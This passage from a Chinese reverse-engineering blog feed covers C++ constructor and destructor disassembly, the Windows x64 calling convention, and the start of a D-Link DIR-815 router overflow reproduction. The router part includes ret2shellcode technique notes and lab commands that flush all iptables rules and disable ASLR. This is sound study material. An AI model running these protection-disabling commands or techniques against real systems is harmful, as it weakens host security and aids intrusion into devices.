rax</span><br><span class="line">.text:<span class="number">00000001400016</span>D2 lea     rdx, [rsp+<span class="number">68</span>h+obj]              ; obj</span><br><span class="line">.text:<span class="number">00000001400016</span>D7 mov     rcx, [rsp+<span class="number">68</span>h+var_40]           ; this</span><br><span class="line">.text:<span class="number">00000001400016</span>DC call    j_??<span class="number">0</span>Person@@QEAA@AEBV0@@Z      ; Person::Person(Person <span class="type">const</span> &amp;)深拷贝，返回新对象</span><br><span class="line">.text:<span class="number">00000001400016</span>DC</span><br><span class="line">.text:<span class="number">00000001400016E1</span> mov     [rsp+<span class="number">68</span>h+var_38.name], rax</span><br><span class="line">.text:<span class="number">00000001400016E6</span> mov     rcx, [rsp+<span class="number">68</span>h+var_38.name]      ; obj</span><br><span class="line">.text:<span class="number">00000001400016</span>EB call    j_?show@@YAXVPerson@@@Z         ; show(Person)</span><br><span class="line">.text:<span class="number">00000001400016</span>EB</span><br><span class="line">.text:<span class="number">00000001400016F</span>0 mov     [rsp+<span class="number">68</span>h+var_48], <span class="number">0</span></span><br><span class="line">.text:<span class="number">00000001400016F</span>8 lea     rcx, [rsp+<span class="number">68</span>h+obj]              ; this</span><br><span class="line">.text:<span class="number">00000001400016F</span>D call    j_??<span class="number">1</span>Person@@QEAA@XZ            ; Person::~Person(<span class="type">void</span>)</span><br><span class="line">.text:<span class="number">00000001400016F</span>D</span><br><span class="line">.text:<span class="number">0000000140001702</span> mov     eax, [rsp+<span class="number">68</span>h+var_48]</span><br><span class="line">.text:<span class="number">0000000140001706</span> add     rsp, <span class="number">68</span>h</span><br><span class="line">.text:<span class="number">000000014000170</span>A retn</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000140003140</span> ; <span class="type">void</span> __fastcall <span class="title function_">Person::Person</span><span class="params">(Person *this, <span class="type">const</span> Person *obj)</span></span><br><span class="line">.text:0000000140003140 ??0Person@@QEAA@AEBV0@@Z proc near      ; CODE XREF: Person::Person(Person <span class="type">const</span> &amp;)↑j</span><br><span class="line">.text:<span class="number">0000000140003140</span>                                         ; DATA XREF: .pdata:<span class="number">000000014000B</span>2AC↓o</span><br><span class="line">.text:<span class="number">0000000140003140</span></span><br><span class="line">.text:<span class="number">0000000140003140</span> var_48= byte ptr <span class="number">-48</span>h</span><br><span class="line">.text:<span class="number">0000000140003140</span> var_44= dword ptr <span class="number">-44</span>h</span><br><span class="line">.text:<span class="number">0000000140003140</span> var_40= qword ptr <span class="number">-40</span>h</span><br><span class="line">.text:<span class="number">0000000140003140</span> var_38= qword ptr <span class="number">-38</span>h</span><br><span class="line">.text:<span class="number">0000000140003140</span> var_30= qword ptr <span class="number">-30</span>h</span><br><span class="line">.text:<span class="number">0000000140003140</span> var_28= qword ptr <span class="number">-28</span>h</span><br><span class="line">.text:<span class="number">0000000140003140</span> var_20= qword ptr <span class="number">-20</span>h</span><br><span class="line">.text:<span class="number">0000000140003140</span> var_18= qword ptr <span class="number">-18</span>h</span><br><span class="line">.text:<span class="number">0000000140003140</span> arg_0= qword ptr  <span class="number">8</span></span><br><span class="line">.text:<span class="number">0000000140003140</span> arg_8= qword ptr  <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">0000000140003140</span></span><br><span class="line">.text:<span class="number">0000000140003140</span> mov     [rsp+arg_8], rdx</span><br><span class="line">.text:<span class="number">0000000140003145</span> mov     [rsp+arg_0], rcx                ; this</span><br><span class="line">.text:<span class="number">000000014000314</span>A sub     rsp, <span class="number">68</span>h</span><br><span class="line">.text:<span class="number">000000014000314</span>E mov     rax, [rsp+<span class="number">68</span>h+arg_0]            ; this</span><br><span class="line">.text:<span class="number">0000000140003153</span> mov     rcx, [rsp+<span class="number">68</span>h+arg_8]            ; obj</span><br><span class="line">.text:<span class="number">0000000140003158</span> mov     ecx, [rcx+<span class="number">8</span>]                    ; obj.age</span><br><span class="line">.text:<span class="number">000000014000315B</span> mov     [rax+<span class="number">8</span>], ecx                    ; this-&gt;age = obj.age;</span><br><span class="line">.text:<span class="number">000000014000315</span>E mov     rax, [rsp+<span class="number">68</span>h+arg_8]            ; obj</span><br><span class="line">.text:<span class="number">0000000140003163</span> mov     rax, [rax]                      ; rax=obj.name</span><br><span class="line">.text:<span class="number">0000000140003166</span> mov     [rsp+<span class="number">68</span>h+var_28], rax</span><br><span class="line">.text:<span class="number">000000014000316B</span> mov     [rsp+<span class="number">68</span>h+var_40], <span class="number">0F</span>FFFFFFFFFFFFFFFh</span><br><span class="line">.text:<span class="number">000000014000316B</span></span><br><span class="line">.text:<span class="number">0000000140003174</span></span><br><span class="line">.text:<span class="number">0000000140003174</span> loc_140003174:                          ; CODE XREF: Person::Person(Person <span class="type">const</span> &amp;)+<span class="number">47</span>↓j</span><br><span class="line">.text:<span class="number">0000000140003174</span> inc     [rsp+<span class="number">68</span>h+var_40]                ; rsp+<span class="number">68</span>h+var_40是局部变量len</span><br><span class="line">.text:<span class="number">0000000140003179</span> mov     rax, [rsp+<span class="number">68</span>h+var_28]</span><br><span class="line">.text:<span class="number">000000014000317</span>E mov     rcx, [rsp+<span class="number">68</span>h+var_40]</span><br><span class="line">.text:<span class="number">0000000140003183</span> cmp     byte ptr [rax+rcx], <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000140003187</span> jnz     <span class="type">short</span> loc_140003174             ; rsp+<span class="number">68</span>h+var_40是局部变量len</span><br><span class="line">.text:<span class="number">0000000140003187</span></span><br><span class="line">.text:<span class="number">0000000140003189</span> mov     rax, [rsp+<span class="number">68</span>h+var_40]</span><br><span class="line">.text:<span class="number">000000014000318</span>E mov     [rsp+<span class="number">68</span>h+var_44], eax           ; <span class="type">int</span> len = <span class="built_in">strlen</span>(obj.name);</span><br><span class="line">.text:<span class="number">0000000140003192</span> movsxd  rax, [rsp+<span class="number">68</span>h+var_44]</span><br><span class="line">.text:<span class="number">0000000140003197</span> inc     rax</span><br><span class="line">.text:<span class="number">000000014000319</span>A mov     rcx, rax                        ; size</span><br><span class="line">.text:<span class="number">000000014000319</span>D call    j_??_U@YAPEAX_K@Z               ; operator new[](<span class="type">unsigned</span> __int64)</span><br><span class="line">.text:<span class="number">000000014000319</span>D</span><br><span class="line">.text:<span class="number">00000001400031</span>A2 mov     [rsp+<span class="number">68</span>h+var_20], rax</span><br><span class="line">.text:<span class="number">00000001400031</span>A7 mov     rax, [rsp+<span class="number">68</span>h+arg_0]</span><br><span class="line">.text:<span class="number">00000001400031</span>AC mov     rcx, [rsp+<span class="number">68</span>h+var_20]</span><br><span class="line">.text:<span class="number">00000001400031B</span>1 mov     [rax], rcx                      ;  this-&gt;name = new <span class="type">char</span>[len + <span class="keyword">sizeof</span>(<span class="type">char</span>)];</span><br><span class="line">.text:<span class="number">00000001400031B</span>4 mov     rax, [rsp+<span class="number">68</span>h+arg_8]</span><br><span class="line">.text:<span class="number">00000001400031B</span>9 mov     rax, [rax]</span><br><span class="line">.text:<span class="number">00000001400031B</span>C mov     [rsp+<span class="number">68</span>h+var_30], rax</span><br><span class="line">.text:<span class="number">00000001400031</span>C1 mov     rax, [rsp+<span class="number">68</span>h+arg_0]</span><br><span class="line">.text:<span class="number">00000001400031</span>C6 mov     rax, [rax]</span><br><span class="line">.text:<span class="number">00000001400031</span>C9 mov     [rsp+<span class="number">68</span>h+var_38], rax</span><br><span class="line">.text:<span class="number">00000001400031</span>CE mov     rax, [rsp+<span class="number">68</span>h+var_38]</span><br><span class="line">.text:<span class="number">00000001400031</span>D3 mov     [rsp+<span class="number">68</span>h+var_18], rax</span><br><span class="line">.text:<span class="number">00000001400031</span>D3</span><br><span class="line">.text:<span class="number">00000001400031</span>D8</span><br><span class="line">.text:<span class="number">00000001400031</span>D8 loc_1400031D8:                          ; CODE XREF: Person::Person(Person <span class="type">const</span> &amp;)+CF↓j</span><br><span class="line">.text:<span class="number">00000001400031</span>D8 mov     rax, [rsp+<span class="number">68</span>h+var_30]</span><br><span class="line">.text:<span class="number">00000001400031</span>DD movzx   eax, byte ptr [rax]</span><br><span class="line">.text:<span class="number">00000001400031E0</span> mov     [rsp+<span class="number">68</span>h+var_48], al</span><br><span class="line">.text:<span class="number">00000001400031E4</span> mov     rax, [rsp+<span class="number">68</span>h+var_38]</span><br><span class="line">.text:<span class="number">00000001400031E9</span> movzx   ecx, [rsp+<span class="number">68</span>h+var_48]</span><br><span class="line">.text:<span class="number">00000001400031</span>EE mov     [rax], cl</span><br><span class="line">.text:<span class="number">00000001400031F</span>0 mov     rax, [rsp+<span class="number">68</span>h+var_30]</span><br><span class="line">.text:<span class="number">00000001400031F</span>5 inc     rax</span><br><span class="line">.text:<span class="number">00000001400031F</span>8 mov     [rsp+<span class="number">68</span>h+var_30], rax</span><br><span class="line">.text:<span class="number">00000001400031F</span>D mov     rax, [rsp+<span class="number">68</span>h+var_38]</span><br><span class="line">.text:<span class="number">0000000140003202</span> inc     rax</span><br><span class="line">.text:<span class="number">0000000140003205</span> mov     [rsp+<span class="number">68</span>h+var_38], rax</span><br><span class="line">.text:<span class="number">000000014000320</span>A cmp     [rsp+<span class="number">68</span>h+var_48], <span class="number">0</span></span><br><span class="line">.text:<span class="number">000000014000320F</span> jnz     <span class="type">short</span> loc_1400031D8             ;  <span class="built_in">strcpy</span>(this-&gt;name, obj.name);</span><br><span class="line">.text:<span class="number">000000014000320F</span></span><br><span class="line">.text:<span class="number">0000000140003211</span> mov     rax, [rsp+<span class="number">68</span>h+arg_0]            ; 返回新对象</span><br><span class="line">.text:<span class="number">0000000140003216</span> add     rsp, <span class="number">68</span>h</span><br><span class="line">.text:<span class="number">000000014000321</span>A retn</span><br></pre></td></tr></table></figure><h2 id="对象作为返回值"><a href="#对象作为返回值" class="headerlink" title="对象作为返回值"></a>对象作为返回值</h2><p>不能用寄存器返回的采用在调用者函数里开辟局部空间，通过拷贝构造函数赋值，同样会存在作为函数参数时的一样的问题</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line">  <span class="type">int</span> count;</span><br><span class="line">  <span class="type">int</span> buffer[<span class="number">10</span>]; <span class="comment">//定义两个数据成员，该类的大小为 44 字节</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Person <span class="title function_">getPerson</span><span class="params">()</span> &#123;</span><br><span class="line">  Person person;</span><br><span class="line">  person.count = <span class="number">10</span>;</span><br><span class="line">  person.buffer[<span class="number">0</span>] = <span class="string">&#x27;g&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> person;  <span class="comment">//返回局部对象</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">  Person person;</span><br><span class="line">  person = getPerson();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d %d %d&quot;</span>, person.count, person.buffer[<span class="number">0</span>], person.buffer[<span class="number">9</span>]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>汇编太长了，不贴了，伪代码基本可以把汇编实现反应出来</p><p>main里开辟局部变量，作为getPerson参数，返回后再复制给v4再给v3</p><p>没搞懂为什么不直接用result，还要再给v4赋值一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall main(int argc, char **argv)</span><br><span class="line">&#123;</span><br><span class="line">  int v3[11]; // [rsp+20h] [rbp-A8h] BYREF</span><br><span class="line">  char v4[44]; // [rsp+50h] [rbp-78h] BYREF</span><br><span class="line">  Person result; // [rsp+80h] [rbp-48h] BYREF</span><br><span class="line"></span><br><span class="line">  qmemcpy(v4, getPerson(&amp;result), sizeof(v4));</span><br><span class="line">  qmemcpy(v3, v4, sizeof(v3));</span><br><span class="line">  j_printf(&quot;%d %d %d&quot;, (unsigned int)v3[0], (unsigned int)v3[1], (unsigned int)v3[10]);</span><br><span class="line">  return 0i64;</span><br><span class="line">&#125;</span><br><span class="line">Person *__fastcall getPerson(Person *result)</span><br><span class="line">&#123;</span><br><span class="line">  LODWORD(result-&gt;name) = 10;</span><br><span class="line">  HIDWORD(result-&gt;name) = &#x27;g&#x27;;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="构造函数调用时机"><a href="#构造函数调用时机" class="headerlink" title="构造函数调用时机"></a>构造函数调用时机</h2><h3 id="局部对象"><a href="#局部对象" class="headerlink" title="局部对象"></a>局部对象</h3><p>隐式传入this指针，返回this指针</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Person person; </span><br></pre></td></tr></table></figure><h3 id="堆对象"><a href="#堆对象" class="headerlink" title="堆对象"></a>堆对象</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line">  Person() &#123;</span><br><span class="line">    age = <span class="number">20</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">  Person* p = new Person;</span><br><span class="line">  p-&gt;age = <span class="number">21</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, p-&gt;age);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>new完后会判断是否申请失败，决定是否调用构造函数，malloc不负责触发构造函数，它也不是运算符，无法进行运算符重载。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000140003010                               main proc near                          ; CODE XREF: main_0↑j</span><br><span class="line">.text:0000000140003010                                                                       ; DATA XREF: .pdata:000000014000B270↓o</span><br><span class="line">.text:0000000140003010</span><br><span class="line">.text:0000000140003010                               var_28= qword ptr -28h</span><br><span class="line">.text:0000000140003010                               var_20= qword ptr -20h</span><br><span class="line">.text:0000000140003010                               var_18= qword ptr -18h</span><br><span class="line">.text:0000000140003010                               var_10= qword ptr -10h</span><br><span class="line">.text:0000000140003010                               arg_0= dword ptr  8</span><br><span class="line">.text:0000000140003010                               arg_8= qword ptr  10h</span><br><span class="line">.text:0000000140003010</span><br><span class="line">.text:0000000140003010                               ; FUNCTION CHUNK AT .text:0000000140005240 SIZE 0000001D BYTES</span><br><span class="line">.text:0000000140003010</span><br><span class="line">.text:0000000140003010                               ; __unwind &#123; // __CxxFrameHandler4_0</span><br><span class="line">.text:0000000140003010 48 89 54 24 10                mov     [rsp+arg_8], rdx</span><br><span class="line">.text:0000000140003015 89 4C 24 08                   mov     [rsp+arg_0], ecx</span><br><span class="line">.text:0000000140003019 48 83 EC 48                   sub     rsp, 48h</span><br><span class="line">.text:000000014000301D B9 04 00 00 00                mov     ecx, 4                          ; size</span><br><span class="line">.text:0000000140003022 E8 F2 DF FF FF                call    j_??2@YAPEAX_K@Z                ; operator new(unsigned __int64)</span><br><span class="line">.text:0000000140003022</span><br><span class="line">.text:0000000140003027 48 89 44 24 20                mov     [rsp+48h+var_28], rax</span><br><span class="line">.text:000000014000302C 48 83 7C 24 20 00             cmp     [rsp+48h+var_28], 0</span><br><span class="line">.text:0000000140003032 74 11                         jz      short loc_140003045             ;跳过构造函数</span><br><span class="line">.text:0000000140003032</span><br><span class="line">.text:0000000140003034 48 8B 4C 24 20                mov     rcx, [rsp+48h+var_28]           ; this</span><br><span class="line">.text:0000000140003039 E8 3D E2 FF FF                call    j_??0Person@@QEAA@XZ            ; Person::Person(void)</span><br><span class="line">.text:0000000140003039</span><br><span class="line">.text:000000014000303E 48 89 44 24 28                mov     [rsp+48h+var_20], rax</span><br><span class="line">.text:0000000140003043 EB 09                         jmp     short loc_14000304E</span><br><span class="line">.text:0000000140003043</span><br><span class="line">.text:0000000140003045                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000140003045</span><br><span class="line">.text:0000000140003045                               loc_140003045:                          ; CODE XREF: main+22↑j</span><br><span class="line">.text:0000000140003045 48 C7 44 24 28 00 00 00 00    mov     [rsp+48h+var_20], 0</span><br><span class="line">.text:0000000140003045</span><br><span class="line">.text:000000014000304E</span><br><span class="line">.text:000000014000304E                               loc_14000304E:                          ; CODE XREF: main+33↑j</span><br><span class="line">.text:000000014000304E 48 8B 44 24 28                mov     rax, [rsp+48h+var_20]</span><br></pre></td></tr></table></figure><h3 id="参数对象-amp-amp-返回对象"><a href="#参数对象-amp-amp-返回对象" class="headerlink" title="参数对象&amp;&amp;返回对象"></a>参数对象&amp;&amp;返回对象</h3><h3 id="全局对象-amp-amp-静态对象"><a href="#全局对象-amp-amp-静态对象" class="headerlink" title="全局对象&amp;&amp;静态对象"></a>全局对象&amp;&amp;静态对象</h3><h2 id="析构函数调用时机"><a href="#析构函数调用时机" class="headerlink" title="析构函数调用时机"></a>析构函数调用时机</h2><h3 id="局部对象-1"><a href="#局部对象-1" class="headerlink" title="局部对象"></a>局部对象</h3><p>传递this指针</p><h3 id="堆对象-1"><a href="#堆对象-1" class="headerlink" title="堆对象"></a>堆对象</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line">  Person() &#123;</span><br><span class="line">    age = <span class="number">20</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  ~Person() &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;~Person()\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">  Person* person = new Person();</span><br><span class="line">  person-&gt;age = <span class="number">21</span>;              <span class="comment">//为了便于讲解，这里没检查指针</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, person-&gt;age);</span><br><span class="line">  delete person;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用delete时如果判断为0直接跳过析构函数，调用代理析构函数时，传入了两参数 tish指针和1</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000001400016E5 mov     [rsp+58h+var_20], rax           ; 对象地址</span><br><span class="line">.text:00000001400016EA cmp     [rsp+58h+var_20], 0</span><br><span class="line">.text:00000001400016F0 jz      short loc_140001708</span><br><span class="line">.text:00000001400016F0</span><br><span class="line">.text:00000001400016F2 mov     edx, 1                          ; unsigned int </span><br><span class="line">.text:00000001400016F7 mov     rcx, [rsp+58h+var_20]           ; this</span><br><span class="line">.text:00000001400016FC call    j_??_GPerson@@QEAAPEAXI@Z       ; Person::`scalar deleting destructor&#x27;(uint)</span><br></pre></td></tr></table></figure><p>第二个参数1表示应该如何析构，例如下面的情况</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">  Person *objs = new Person[<span class="number">3</span>];  <span class="comment">//申请对象数组</span></span><br><span class="line">  delete[] objs;                 <span class="comment">//释放对象数组</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>new申请时申请了20大小，比Person[3]多了堆空间的首地址处的8字节来内容保存对象数量</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000000014000169D mov     ecx, 14h                        ; size</span><br><span class="line">.text:00000001400016A2 call    j_??_U@YAPEAX_K@Z               ; operator new[](unsigned __int64)</span><br><span class="line">.text:00000001400016A2</span><br><span class="line">.text:00000001400016A7 mov     [rsp+68h+var_38], rax</span><br><span class="line">.text:00000001400016AC cmp     [rsp+68h+var_38], 0</span><br><span class="line">.text:00000001400016B2 jz      short loc_1400016FF</span><br><span class="line">.text:00000001400016B2</span><br><span class="line">.text:00000001400016B4 mov     rax, [rsp+68h+var_38]</span><br><span class="line">.text:00000001400016B9 mov     qword ptr [rax], 3             ;首地址处的8字节保存对象数量</span><br></pre></td></tr></table></figure><p>调用代理构造函数(第一个对象地址,对象大小，对象个数，构造函数地址),代理构造函数去一个一个构造对象</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000001400016C0 mov     rax, [rsp+68h+var_38]</span><br><span class="line">.text:00000001400016C5 add     rax, 8</span><br><span class="line">.........</span><br><span class="line">.text:00000001400016D5 lea     r9, j_??0Person@@QEAA@XZ        ; constructor</span><br><span class="line">.text:00000001400016DC mov     r8d, 3                          ; count</span><br><span class="line">.text:00000001400016E2 mov     edx, 4                          ; size</span><br><span class="line">.text:00000001400016E7 mov     rcx, rax                        ; ptr</span><br><span class="line">.text:00000001400016EA call    j_??_L@YAXPEAX_K1P6AX0@Z2@Z     ; `eh vector constructor iterator&#x27;(void *,unsigned __int64,unsigned __int64,void (*)(void *),void (*)(vo</span><br></pre></td></tr></table></figure><p>调用代理析构函数(第一个对象地址，释放对象类型标志:1为释放单个对象，3为释放对象数组，0表示单个对象仅仅执行析构函数，不释放堆空间，2调用对象数组析构函数，不释放堆空间)</p><p>delete[]参数二为3，delete为1</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000000014000172E mov     edx, 3                          ; unsigned int</span><br><span class="line">.text:0000000140001733 mov     rcx, [rsp+68h+var_28]           ; this</span><br><span class="line">.text:0000000140001738 call    j_??_EPerson@@QEAAPEAXI@Z       ; Person::`vector deleting destructor&#x27;(uint)</span><br></pre></td></tr></table></figure><h3 id="参数对象-amp-amp-返回对象-1"><a href="#参数对象-amp-amp-返回对象-1" class="headerlink" title="参数对象&amp;&amp;返回对象"></a>参数对象&amp;&amp;返回对象</h3><h3 id="全局对-amp-amp-静态对象"><a href="#全局对-amp-amp-静态对象" class="headerlink" title="全局对&amp;&amp;静态对象"></a>全局对&amp;&amp;静态对象</h3><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><strong>C++反汇编与逆向分析技术揭秘</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Windows x64 calling conventions</title>
      <link href="/2023/10/22/windows-x64-calling-conventions/"/>
      <url>/2023/10/22/windows-x64-calling-conventions/</url>
      
        <content type="html"><![CDATA[<p>前四个参数rcx，rdx ，r8，r9，其余参数从右往左入栈，小于等于64位返回值由RAX传递</p><p>浮点类型参数由XMM0,XMM1,XMM2,XMM3依次传递，浮点返回值由XMM0</p><p>非页函数寄存器传参也需要分配参数栈空间，调用者清理堆栈</p><p>cal之前堆栈必须保持 16 字节对齐</p><p>小于64位的参数并不进行高位零扩展，也就是高位是无法预测的垃圾数据(x64对寄存器低32位赋值会把高32位置零)。</p><p>emm，写着写着发现手册里说的太清楚了，撤了：<a href="https://learn.microsoft.com/zh-cn/cpp/build/x64-calling-convention?view=msvc-170">https://learn.microsoft.com/zh-cn/cpp/build/x64-calling-convention?view=msvc-170</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>初探路由器挖掘</title>
      <link href="/2023/10/22/first-router/"/>
      <url>/2023/10/22/first-router/</url>
      
        <content type="html"><![CDATA[<p>有些东西搭建起来比较麻烦，iot虚拟机：<a href="https://github.com/adi0x90/attifyos">https://github.com/adi0x90/attifyos</a></p><p>cgibin和httpd关系:<a href="https://bbs.kanxue.com/thread-276464.htm">https://bbs.kanxue.com/thread-276464.htm</a></p><p>对于一些分支跳转指令，流水线会停顿一个周期左右，为了利用起来这一个周期，提供流水线效率，在分支跳转指令后加入不管分支发生与否其总是被执行的指令<a href="https://blog.csdn.net/weixin_46318370/article/details/108033218">1</a>,加入指令的位置一般叫分支延迟槽<br>MIPS分支延迟槽中的指令先于分支指令提交，分支跳转指令流：分支跳转指令 -&gt; 延时槽指令 -&gt; 目标跳转地址的指令</p><p>比如下面jalr到printf之前会先执行指令li传参</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:004099BC 09 F8 20 03                   jalr    $t9 ; printf</span><br><span class="line">.text:004099C0 88 A9 84 24                   li      $a0, aHttp11200OkCon_3    分支延迟槽</span><br></pre></td></tr></table></figure><p>分支延迟槽在 DSP处理器和历史较悠久的 RISC 上比较常见，如 MIPS,  SPARC 等</p><p>现在流水线级数越来越深，普遍采用分支预测技术<a href="https://www.zhihu.com/question/546825692">2</a>，但为了软件上的兼容性 MIPS 和 SPARC 还是作了保留</p><p>MIPS CPU大部分采用指令和数据各自拥有一个独立的cache的方案icache和dcache，缓存满了才会flush，将数据写回到主存，MIPS架构默认没有打开堆栈不可执行保护(NX)，常见的就是ret2shellcode，直接ret2shellcode会执行未写入shellcode的内存位置</p><p>为了写回shellcode并使icache失效，ret2shellcode之前一般调用堵塞函数sleep，处理器会进程调度切换上下文，缓存会自动flush</p><h2 id="qemu系统级模拟"><a href="#qemu系统级模拟" class="headerlink" title="qemu系统级模拟"></a>qemu系统级模拟</h2><p><a href="https://people.debian.org/~aurel32/qemu/">https://people.debian.org/~aurel32/qemu/</a> 下载好mips文件系统和内核镜像</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo qemu-system-mipsel \</span><br><span class="line">-M malta \</span><br><span class="line">-kernel vmlinux-3.2.0-4-4kc-malta \</span><br><span class="line">-hda debian_squeeze_mipsel_standard.qcow2 \</span><br><span class="line">-append <span class="string">&quot;root=/dev/sda1 console=tty0&quot;</span> \</span><br><span class="line">-net nic \</span><br><span class="line">-net tap \</span><br><span class="line">-nographic \</span><br></pre></td></tr></table></figure><p>root&#x2F;root登入</p><h3 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h3><p><strong>宿主机网络配置</strong>:依赖库<code>sudo apt-get install bridge-utils uml-utilities</code></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo sysctl -w net.ipv4.ip_forward=1</span><br><span class="line">sudo iptables -F</span><br><span class="line">sudo iptables -X</span><br><span class="line">sudo iptables -t nat -F</span><br><span class="line">sudo iptables -t nat -X</span><br><span class="line">sudo iptables -t mangle -F</span><br><span class="line">sudo iptables -t mangle -X</span><br><span class="line">sudo iptables -P INPUT ACCEPT</span><br><span class="line">sudo iptables -P FORWARD ACCEPT</span><br><span class="line">sudo iptables -P OUTPUT ACCEPT</span><br><span class="line">sudo iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE</span><br><span class="line">sudo iptables -I FORWARD 1 -i tap0 -j ACCEPT</span><br><span class="line">sudo iptables -I FORWARD 1 -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br><span class="line">sudo ifconfig tap0 192.168.100.254 netmask 255.255.255.0<span class="comment">#设置tap0虚拟网卡的IP地址及子网掩码</span></span><br></pre></td></tr></table></figure><p><img src="/2023/10/22/first-router/image-20231027091950064.png" alt="image-20231027091950064"></p><p><strong>qemu模拟机网络配置</strong></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#！/bin/sh</span></span><br><span class="line">ifconfig eth0 192.168.100.2 netmask 255.255.255.0</span><br><span class="line">route add default gw 192.168.100.254</span><br></pre></td></tr></table></figure><p><img src="/2023/10/22/first-router/image-20231027091815775.png" alt="image-20231027091815775"></p><p>scp传文件:scp 文件名 目标用户名@目标ip:目标机器路径</p><h3 id="gdbserver调试"><a href="#gdbserver调试" class="headerlink" title="gdbserver调试"></a>gdbserver调试</h3><p><strong>模拟机里</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gdbserver ./file :port </span><br></pre></td></tr></table></figure><p>正常路由环境为了程序运行速度会取消 canary，地址随机化等保护机制 <code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></p><p><strong>宿主机</strong></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo gdb-multiarch ./file -ex <span class="string">&quot;target remote 模拟机ip:模拟机server指定端口&quot;</span></span><br></pre></td></tr></table></figure><h2 id="漏洞复现-D-Link-DIR-815-路由器多次溢出"><a href="#漏洞复现-D-Link-DIR-815-路由器多次溢出" class="headerlink" title="漏洞复现 D-Link DIR-815 路由器多次溢出"></a>漏洞复现 D-Link DIR-815 路由器多次溢出</h2><p>固件下载 <a href="https://rebyte.me/en/d-link/89510/file-592084/">https://rebyte.me/en/d-link/89510/file-592084/</a></p><p>最后返回可控寄存器很多</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00409A28 E4 04 BF 8F                   lw      $ra, 0x4C0+var_s24($sp)</span><br><span class="line">.text:00409A2C 21 10 E0 02                   move    $v0, $s7</span><br><span class="line">.text:00409A30 E0 04 BE 8F                   lw      $fp, 0x4C0+var_s20($sp)</span><br><span class="line">.text:00409A34 DC 04 B7 8F                   lw      $s7, 0x4C0+var_s1C($sp)</span><br><span class="line">.text:00409A38 D8 04 B6 8F                   lw      $s6, 